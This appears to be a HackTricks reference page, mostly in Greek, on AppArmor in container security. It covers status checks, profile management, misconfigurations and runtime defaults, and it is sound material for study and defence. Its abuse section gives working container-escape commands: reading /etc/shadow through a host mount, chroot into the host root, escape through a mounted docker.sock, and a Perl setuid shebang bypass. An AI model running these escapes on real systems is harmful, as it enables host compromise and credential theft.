# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το AppArmor είναι ένα σύστημα **Υποχρεωτικού Ελέγχου Πρόσβασης** που εφαρμόζει περιορισμούς μέσω προφίλ ανά πρόγραμμα. Σε αντίθεση με τους παραδοσιακούς ελέγχους DAC, που εξαρτώνται σε μεγάλο βαθμό από την ιδιοκτησία χρήστη και ομάδας, το AppArmor επιτρέπει στον πυρήνα να επιβάλει μια πολιτική προσαρτημένη στη διαδικασία αυτή καθαυτή. Στα περιβάλλοντα container αυτό έχει σημασία επειδή ένα workload μπορεί να έχει αρκετά παραδοσιακά προνόμια για να επιχειρήσει μια ενέργεια και παρόλα αυτά να απορριφθεί επειδή το προφίλ AppArmor δεν επιτρέπει την αντίστοιχη διαδρομή, mount, συμπεριφορά δικτύου ή χρήση capability.

## Ρόλος στην απομόνωση container

Οι εκτιμήσεις ασφάλειας container συχνά σταματούν στις capabilities και στο seccomp, αλλά το AppArmor εξακολουθεί να έχει σημασία μετά από αυτούς τους ελέγχους. Φανταστείτε ένα container που έχει περισσότερα προνόμια απ' ό,τι θα έπρεπε, ή ένα workload που χρειαζόταν μια επιπλέον capability για λόγους λειτουργίας. Το AppArmor μπορεί ακόμα να περιορίσει την πρόσβαση σε αρχεία, τη συμπεριφορά mounts, τη δικτύωση και πρότυπα εκτέλεσης με τρόπους που μπλοκάρουν την προφανή οδό κατάχρησης. Γι' αυτό η απενεργοποίηση του AppArmor "μόνο για να λειτουργήσει η εφαρμογή" μπορεί να μετατρέψει αθόρυβα μια απλώς ριψοκίνδυνη διαμόρφωση σε μια που είναι ενεργά εκμεταλλεύσιμη.

## Εργαστήριο

Για να ελέγξετε εάν το AppArmor είναι ενεργό στο host, χρησιμοποιήστε:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Για να δείτε υπό ποιον χρήστη εκτελείται η τρέχουσα διεργασία του container:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Η διαφορά είναι διδακτική. Στην κανονική περίπτωση, η διεργασία θα πρέπει να εμφανίζει ένα AppArmor context συνδεδεμένο με το προφίλ που επέλεξε το runtime. Στην περίπτωση unconfined, αυτή η επιπλέον στρώση περιορισμού εξαφανίζεται.

Μπορείτε επίσης να ελέγξετε τι πιστεύει ότι έχει εφαρμόσει το Docker:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Χρήση κατά το runtime

Το Docker μπορεί να εφαρμόσει ένα προεπιλεγμένο ή προσαρμοσμένο προφίλ AppArmor όταν ο host το υποστηρίζει. Το Podman μπορεί επίσης να ενσωματωθεί με το AppArmor σε συστήματα βασισμένα σε AppArmor, αν και σε διανομές όπου προτεραιότητα έχει το SELinux το άλλο MAC σύστημα συχνά παίζει τον κυρίαρχο ρόλο. Το Kubernetes μπορεί να εκθέσει πολιτική AppArmor σε επίπεδο workload σε κόμβους που πραγματικά υποστηρίζουν AppArmor. Το LXC και σχετικά περιβάλλοντα system-container της οικογένειας Ubuntu χρησιμοποιούν επίσης εκτενώς το AppArmor.

Το πρακτικό σημείο είναι ότι το AppArmor δεν είναι ένα "Docker feature". Είναι μια λειτουργία του host/πυρήνα την οποία διάφορα runtimes μπορούν να επιλέξουν να εφαρμόσουν. Εάν ο host δεν το υποστηρίζει ή στο runtime ζητηθεί να εκτελεστεί unconfined, η υποτιθέμενη προστασία στην ουσία δεν υπάρχει.

Σε hosts με δυνατότητα Docker και AppArmor, το πιο γνωστό προεπιλεγμένο είναι το `docker-default`. Το προφίλ αυτό παράγεται από το AppArmor template του Moby και είναι σημαντικό επειδή εξηγεί γιατί κάποια capability-based PoCs εξακολουθούν να αποτυγχάνουν σε ένα προεπιλεγμένο container. Εν συντομία, το `docker-default` επιτρέπει κανονικό networking, αρνείται εγγραφές σε μεγάλο μέρος του `/proc`, αρνείται πρόσβαση σε ευαίσθητα τμήματα του `/sys`, μπλοκάρει λειτουργίες mount και περιορίζει το ptrace ώστε να μην αποτελεί γενικό primitive διερεύνησης του host. Η κατανόηση αυτής της βάσης βοηθά να διακρίνεις μεταξύ "το container έχει `CAP_SYS_ADMIN`" και "το container μπορεί πραγματικά να χρησιμοποιήσει αυτή την capability ενάντια στις kernel διεπαφές που με ενδιαφέρουν".

## Διαχείριση προφίλ

Τα προφίλ AppArmor συνήθως αποθηκεύονται κάτω από το `/etc/apparmor.d/`. Μια κοινή σύμβαση ονοματοδοσίας είναι να αντικαθίστανται τα slashes στη διαδρομή του εκτελέσιμου αρχείου με τελείες. Για παράδειγμα, ένα προφίλ για το `/usr/bin/man` αποθηκεύεται συνήθως ως `/etc/apparmor.d/usr.bin.man`. Αυτή η λεπτομέρεια έχει σημασία τόσο στην άμυνα όσο και στην αξιολόγηση επειδή μόλις γνωρίζεις το ενεργό όνομα προφίλ, συχνά μπορείς να εντοπίσεις γρήγορα το αντίστοιχο αρχείο στον host.

Χρήσιμες εντολές διαχείρισης από την πλευρά του host περιλαμβάνουν:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Ο λόγος που αυτές οι εντολές έχουν σημασία σε ένα reference για container-security είναι ότι εξηγούν πώς τα profiles κατασκευάζονται πραγματικά, φορτώνονται, μεταβαίνουν σε complain mode και τροποποιούνται μετά από αλλαγές στην εφαρμογή. Εάν ένας operator έχει τη συνήθεια να βάζει τα profiles σε complain mode κατά το troubleshooting και να ξεχνά να επαναφέρει την enforcement, το container μπορεί να φαίνεται προστατευμένο στην τεκμηρίωση ενώ στην πραγματικότητα συμπεριφέρεται πολύ πιο ελαστικά.

### Building And Updating Profiles

`aa-genprof` μπορεί να παρακολουθήσει τη συμπεριφορά της εφαρμογής και να βοηθήσει στη δημιουργία ενός profile αλληλεπιδραστικά:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` μπορεί να δημιουργήσει ένα πρότυπο προφίλ που αργότερα μπορεί να φορτωθεί με `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Όταν το δυαδικό αρχείο αλλάζει και η πολιτική χρειάζεται ενημέρωση, το `aa-logprof` μπορεί να αναπαράγει τις απορρίψεις που βρέθηκαν στα αρχεία καταγραφής και να βοηθήσει τον χειριστή να αποφασίσει αν θα τις επιτρέψει ή θα τις απορρίψει:
```bash
sudo aa-logprof
```
### Καταγραφές

Οι απορρίψεις του AppArmor είναι συχνά ορατές μέσω του `auditd`, του syslog ή εργαλείων όπως το `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Αυτό είναι χρήσιμο επιχειρησιακά και επιθετικά. Οι αμυνόμενοι το χρησιμοποιούν για να βελτιώσουν τα προφίλ. Οι επιτιθέμενοι το χρησιμοποιούν για να μάθουν ποιο ακριβώς μονοπάτι ή ποια ενέργεια απορρίπτεται και αν το AppArmor είναι ο έλεγχος που εμποδίζει μια αλυσίδα εκμετάλλευσης.

### Εντοπισμός του Ακριβούς Αρχείου Προφίλ

Όταν ένα runtime εμφανίζει ένα συγκεκριμένο όνομα AppArmor profile για ένα container, συχνά είναι χρήσιμο να αντιστοιχίσετε αυτό το όνομα πίσω στο αρχείο προφίλ στο δίσκο:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Αυτό είναι ιδιαίτερα χρήσιμο κατά την επιθεώρηση από την πλευρά του host, επειδή γεφυρώνει το χάσμα ανάμεσα στο "the container says it is running under profile `lowpriv`" και στο "the actual rules live in this specific file that can be audited or reloaded".

## Λανθασμένες ρυθμίσεις

Το πιο προφανές λάθος είναι `apparmor=unconfined`. Οι administrators συχνά το θέτουν κατά την αποσφαλμάτωση μιας εφαρμογής που απέτυχε επειδή το profile μπλόκαρε σωστά κάτι επικίνδυνο ή απροσδόκητο. Αν η σημαία παραμείνει σε production, ολόκληρο το MAC layer έχει ουσιαστικά αφαιρεθεί.

Ένα ακόμη πιο λεπτό πρόβλημα είναι η υπόθεση ότι τα bind mounts είναι ακίνδυνα επειδή τα δικαιώματα αρχείων φαίνονται φυσιολογικά. Επειδή το AppArmor είναι path-based, η έκθεση host paths σε εναλλακτικές τοποθεσίες mount μπορεί να αλληλεπιδράσει άσχημα με τους κανόνες path. Ένα τρίτο λάθος είναι το να ξεχάσει κανείς ότι ένα profile name σε ένα config file σημαίνει πολύ λίγα αν ο host kernel δεν εφαρμόζει πραγματικά το AppArmor.

## Καταχρήσεις

Όταν το AppArmor λείπει, λειτουργίες που προηγουμένως περιορίζονταν μπορεί ξαφνικά να λειτουργούν: ανάγνωση ευαίσθητων paths μέσω bind mounts, πρόσβαση σε μέρη του procfs ή sysfs που θα έπρεπε να ήταν πιο δύσκολα στη χρήση, εκτέλεση ενέργειων σχετικών με mount εάν capabilities/seccomp επίσης το επιτρέπουν, ή χρήση paths που ένα profile κανονικά θα απαγόρευε. Το AppArmor συχνά είναι ο μηχανισμός που εξηγεί γιατί μια προσπάθεια breakout βασισμένη σε capabilities "should work" στη θεωρία αλλά παρ' όλα αυτά αποτυγχάνει στην πράξη. Αφαιρέστε το AppArmor, και η ίδια προσπάθεια μπορεί να αρχίσει να πετυχαίνει.

Αν υποψιάζεστε ότι το AppArmor είναι το κύριο πράγμα που σταματάει μια αλυσίδα κατάχρησης τύπου path-traversal, bind-mount ή mount-based, το πρώτο βήμα συνήθως είναι να συγκρίνετε τι γίνεται προσβάσιμο με και χωρίς profile. Για παράδειγμα, αν ένα host path είναι mounted μέσα στο container, ξεκινήστε ελέγχοντας αν μπορείτε να το traverse και να το διαβάσετε:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Εάν το container διαθέτει επίσης μια επικίνδυνη δυνατότητα όπως `CAP_SYS_ADMIN`, μία από τις πιο πρακτικές δοκιμές είναι να εξακριβώσετε αν το AppArmor αποτελεί τον έλεγχο που εμποδίζει λειτουργίες mount ή την πρόσβαση σε ευαίσθητα αρχεία συστήματος του πυρήνα:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Σε περιβάλλοντα όπου ένα host path είναι ήδη διαθέσιμο μέσω bind mount, η απώλεια του AppArmor μπορεί επίσης να μετατρέψει ένα read-only information-disclosure issue σε άμεση πρόσβαση σε αρχεία του host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Το νόημα αυτών των εντολών δεν είναι ότι το AppArmor από μόνο του δημιουργεί το breakout. Είναι ότι μόλις αφαιρεθεί το AppArmor, πολλοί τρόποι κατάχρησης που βασίζονται στο filesystem και στα mounts γίνονται άμεσα ελέγξιμοι.

### Πλήρες Παράδειγμα: AppArmor Απενεργοποιημένο + Host Root Mounted

Αν το container ήδη έχει το host root bind-mounted στο `/host`, η αφαίρεση του AppArmor μπορεί να μετατρέψει μια μπλοκαρισμένη διαδρομή κατάχρησης του filesystem σε πλήρες host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Μόλις το shell εκτελείται μέσω του host filesystem, το workload έχει ουσιαστικά ξεφύγει από τα όρια του container:
```bash
id
hostname
cat /etc/shadow | head
```
### Πλήρες παράδειγμα: AppArmor απενεργοποιημένο + Runtime Socket

Αν το πραγματικό εμπόδιο ήταν το AppArmor γύρω από το runtime state, ένα mounted socket μπορεί να είναι αρκετό για μια πλήρη απόδραση:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Το ακριβές μονοπάτι εξαρτάται από το σημείο προσάρτησης, αλλά το τελικό αποτέλεσμα είναι το ίδιο: το AppArmor δεν εμποδίζει πλέον την πρόσβαση στο runtime API, και το runtime API μπορεί να εκκινήσει ένα container που μπορεί να συμβιβάσει τον host.

### Πλήρες Παράδειγμα: Path-Based Bind-Mount Bypass

Επειδή το AppArmor είναι βασισμένο σε διαδρομές, η προστασία του `/proc/**` δεν προστατεύει αυτόματα το ίδιο περιεχόμενο procfs του host όταν είναι προσβάσιμο μέσω διαφορετικής διαδρομής:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Ο αντίκτυπος εξαρτάται από το τι ακριβώς είναι mounted και αν το εναλλακτικό μονοπάτι παρακάμπτει επίσης άλλους ελέγχους, αλλά αυτό το μοτίβο είναι ένας από τους πιο ξεκάθαρους λόγους για τους οποίους το AppArmor πρέπει να αξιολογείται μαζί με το mount layout αντί για απομόνωση.

### Full Example: Shebang Bypass

Η πολιτική του AppArmor μερικές φορές στοχεύει ένα μονοπάτι interpreter με τρόπο που δεν λαμβάνει πλήρως υπόψη την εκτέλεση script μέσω της διαχείρισης shebang. Ένα ιστορικό παράδειγμα περιελάμβανε τη χρήση ενός script του οποίου η πρώτη γραμμή δείχνει σε έναν confined interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ένα τέτοιο παράδειγμα είναι σημαντικό ως υπενθύμιση ότι η πρόθεση του profile και η πραγματική συμπεριφορά εκτέλεσης μπορούν να αποκλίνουν. Όταν γίνεται ανασκόπηση του AppArmor σε container περιβάλλοντα, τα interpreter chains και τα alternate execution paths αξίζουν ιδιαίτερη προσοχή.

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να απαντηθούν γρήγορα τρία ερωτήματα: είναι το AppArmor ενεργοποιημένο στον host, είναι η τρέχουσα διεργασία περιορισμένη, και εφάρμοσε το runtime πραγματικά ένα profile σε αυτό το container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
What is interesting here:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.

If a container already has elevated privileges for operational reasons, leaving AppArmor enabled often makes the difference between a controlled exception and a much broader security failure.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Uses the `docker-default` AppArmor profile unless overridden | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Host-dependent | AppArmor is supported through `--security-opt`, but the exact default is host/runtime dependent and less universal than Docker's documented `docker-default` profile | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Conditional default | If `appArmorProfile.type` is not specified, the default is `RuntimeDefault`, but it is only applied when AppArmor is enabled on the node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` with a weak profile, nodes without AppArmor support |
| containerd / CRI-O under Kubernetes | Follows node/runtime support | Common Kubernetes-supported runtimes support AppArmor, but actual enforcement still depends on node support and workload settings | Same as Kubernetes row; direct runtime configuration can also skip AppArmor entirely |

For AppArmor, the most important variable is often the **host**, not only the runtime. A profile setting in a manifest does not create confinement on a node where AppArmor is not enabled.
